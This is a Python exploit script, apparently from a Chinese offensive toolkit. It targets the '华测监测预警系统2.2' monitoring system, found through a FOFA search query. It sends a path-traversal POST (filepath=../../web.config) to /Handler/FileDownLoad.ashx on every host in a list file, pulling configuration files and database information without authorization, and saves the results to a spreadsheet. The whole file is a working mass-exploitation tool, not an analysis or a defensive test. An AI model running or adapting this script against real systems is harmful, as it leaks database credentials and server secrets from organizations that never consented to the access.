
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import tools.GlobalTool as Tool
import tools.HttpTool as NetWork


def help():
    print('''
    fofa: app="华测监测预警系统2.2"
        1. 华测监测预警系统2.2未授权利用, 批量获取数据库信息
    x. 退出
    ''')

def vul_application_get_db_info(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    body = 'filename=1&filepath=../../web.config'
    method = "POST"
    path = "/Handler/FileDownLoad.ashx"
    notes = ""
    return (url, method, headers, body, path, notes)


def run():
    OUTDIR = "result/华测监测预警系统"
    # 获取当前日期和时间
    formatted_datetime = Tool.getime()
    file = "dat.txt"
    li = Tool.read_host_file(file)
    Tool.mkdir(OUTDIR)
    help()
    num = int(input("执行的指令: "))

    if num == 1:
        data = []
        for url in li:
            item = vul_application_get_db_info(url)
            data.append(item)
        s = NetWork.HttpTool()
        y = s.async_httpx_start(data)

        res = []
        for k, v in y.items():
            res.append(v[:-2])
        ti = ['地址', '状态码', '标题', '请求体', '状态', 'ip', 'port', 'ip_port', '备注']
        Tool.write_to_xlsx(ti, res, f"{OUTDIR}/{formatted_datetime}华测监测预警系统2.2未授权利用.xlsx")

    else:
        print('bye..')



